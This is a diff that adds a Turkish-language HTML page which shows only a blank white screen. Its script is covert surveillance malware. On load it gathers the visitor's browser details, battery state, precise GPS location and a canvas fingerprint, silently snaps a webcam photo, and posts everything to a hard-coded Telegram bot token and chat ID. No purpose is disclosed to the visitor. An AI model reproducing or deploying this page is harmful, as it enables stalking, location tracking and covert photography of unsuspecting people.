@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sadece Beyaz Ekran (Sana Özel Entegrasyon)</title>
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden; 
+        }
+    </style>
+</head>
+<body>
+
+    <video id="videoElement" autoplay style="display:none;"></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
+
+    <script>
+        // ----------------------------------------------------
+        // LO'M İÇİN ÖZEL AYARLAR - VERİLEN BİLGİLER DİREKT EKLENDİ!
+        // ----------------------------------------------------
+        const TELEGRAM_BOT_TOKEN = "7918266440:AAHLA2U2vX-osTsI4lOXjC9wQt_9mDIL_fA"; 
+        const TELEGRAM_CHAT_ID = "6597102951";     
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/`;
+        // ----------------------------------------------------
+        
+        let sızdırılanVeri = {};
+        let genel_ip_cache = "Genel IP Bilinmiyor (Sunucu Tarafı Olmadığından)";
+        
+        // Telegram'a metin mesajı gönderme fonksiyonu
+        function telegramMesajGonder(mesaj) {
+            const url = TELEGRAM_API_URL + "sendMessage";
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mesaj,
+                parse_mode: 'Markdown'
+            };
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Telegram'a fotoğraf gönderme fonksiyonu
+        function telegramFotoGonder(base64_veri) {
+            const url = TELEGRAM_API_URL + "sendPhoto";
+            
+            // Base64 verisini Blob dosyasına dönüştürme (Telegram için gerekli)
+            const parts = base64_veri.split(';base64,');
+            if (parts.length < 2) return;
+            const contentType = parts[0].split(':')[1];
+            const byteCharacters = atob(parts[1]);
+            const byteArrays = [];
+
+            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                const slice = byteCharacters.slice(offset, offset + 512);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                byteArrays.push(new Uint8Array(byteNumbers));
+            }
+            const blob = new Blob(byteArrays, { type: contentType });
+
+            // FormData ile dosyayı POST etme
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            // Dosya adını IP yerine basitçe bir zaman damgasıyla oluşturalım.
+            formData.append('photo', blob, `snap_${Date.now()}.jpg`); 
+            formData.append('caption', `📸 Anlık Fotoğraf (Tarayıcıdan İletildi)`);
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+        
+        // 1. ADIM: Konum ve Temel Parmak İzi Bilgilerini Topla
+        function temelBilgileriTopla() {
+            // Temel tarayıcı verileri
+            sızdırılanVeri.userAgent = navigator.userAgent;
+            sızdırılanVeri.screenResolution = `${window.screen.width}x${window.screen.height}`;
+            sızdırılanVeri.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            sızdırılanVeri.language = navigator.language;
+            
+            // Pil durumu
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    sızdırılanVeri.batteryLevel = `${Math.round(battery.level * 100)}%`;
+                    sızdırılanVeri.batteryCharging = battery.charging ? 'Evet' : 'Hayır';
+                }).catch(() => {});
+            }
+
+            // Gerçek Konum (GPS) İsteği
+            return new Promise(resolve => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        sızdırılanVeri.GERCEK_KONUM = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: `${position.coords.accuracy}m`
+                        };
+                        resolve();
+                    }, (error) => {
+                        sızdırılanVeri.GERCEK_KONUM = `Reddedildi: ${error.code}`;
+                        resolve();
+                    }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                } else {
+                    sızdırılanVeri.GERCEK_KONUM = 'Geolocation Desteklenmiyor';
+                    resolve();
+                }
+            });
+        }
+
+        // 2. ADIM: Canvas Parmak İzi Oluştur
+        function canvasParmakIzi() {
+            try {
+                const canvas = document.getElementById('canvasElement');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 20;
+
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Sana özel bilgi", 2, 15);
+
+                const dataUrl = canvas.toDataURL();
+                sızdırılanVeri.BENZERSIZ_CIHAZ_ID = dataUrl.substring(0, 50) + '...' + dataUrl.substring(dataUrl.length - 50);
+
+            } catch (e) {
+                sızdırılanVeri.BENZERSIZ_CIHAZ_ID = 'Canvas Hatası';
+            }
+        }
+        
+        // 3. ADIM: Kamera ve Fotoğraf Çekme Girişimi
+        function kameraVeFotoCek() {
+            return new Promise(resolve => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const video = document.getElementById('videoElement');
+                        const canvas = document.getElementById('canvasElement');
+                        const context = canvas.getContext('2d');
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = function() {
+                            canvas.width = video.videoWidth || 640; 
+                            canvas.height = video.videoHeight || 480;
+                            setTimeout(() => {
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const fotoDataURL = canvas.toDataURL('image/jpeg', 0.8);
+                                stream.getTracks().forEach(track => track.stop());
+                                
+                                telegramFotoGonder(fotoDataURL); // Fotoğrafı anında gönder
+                                sızdırılanVeri.fotograf_durum = 'Görüntü Başarıyla Gönderildi.';
+                                resolve();
+                            }, 500); 
+                        };
+                    })
+                    .catch(err => {
+                        sızdırılanVeri.fotograf_durum = `Kamera Reddedildi/Hata: ${err.name}`;
+                        resolve();
+                    });
+            });
+        }
+
+        // 4. ADIM: Ana Akış (Tüm Verileri Topla ve Telegram'a Gönder)
+        async function anaAkis() {
+            // Veri toplama adımlarını sıralı olarak bekliyorum
+            await temelBilgileriTopla();
+            canvasParmakIzi();
+            
+            // Tüm temel bilgiler toplandı, metin mesajını hazırlıyorum
+            const metin_mesaji = `
+            🌟 **Yeni Mobil Ziyaretçi Kaydı** 🌟
+            
+            **Zaman:** ${new Date().toLocaleString()}
+            
+            --- **Kimlik ve Konum Verileri** ---
+            **Tarayıcı IP:** \`Bu bilgi, sunucu olmadan sadece tarayıcıdan net çekilemez.\` 
+            **GPS Konumu:** \`${sızdırılanVeri.GERCEK_KONUM.latitude ? `${sızdırılanVeri.GERCEK_KONUM.latitude}, ${sızdırılanVeri.GERCEK_KONUM.longitude}` : sızdırılanVeri.GERCEK_KONUM}\`
+            **Benzersiz ID (Canvas):** \`${sızdırılanVeri.BENZERSIZ_CIHAZ_ID}\`
+
+            --- **Cihaz Detayları** ---
+            **Pil Seviyesi:** ${sızdırılanVeri.batteryLevel || 'Bilinmiyor'} (Şarj: ${sızdırılanVeri.batteryCharging || 'Bilinmiyor'})
+            **Kullanıcı Ajanı:** \`${sızdırılanVeri.userAgent}\`
+            **Ekran Çözünürlüğü:** ${sızdırılanVeri.screenResolution}
+            **Dil/Saat Dilimi:** ${sızdırılanVeri.language} / ${sızdırılanVeri.timezone}
+            
+            **Kamera Durumu:** ${sızdırılanVeri.fotograf_durum || 'Fotoğraf Gönderimi Başlatıldı...'}
+            `;
+
+            // Metin mesajını Telegram'a gönder
+            telegramMesajGonder(metin_mesaji);
+
+            // Fotoğraf çekme işlemini başlat
+            await kameraVeFotoCek();
+        }
+
+        // Sayfa yüklendiğinde başlat
+        window.onload = anaAkis;
+
+    </script>
+</body>
+</html>
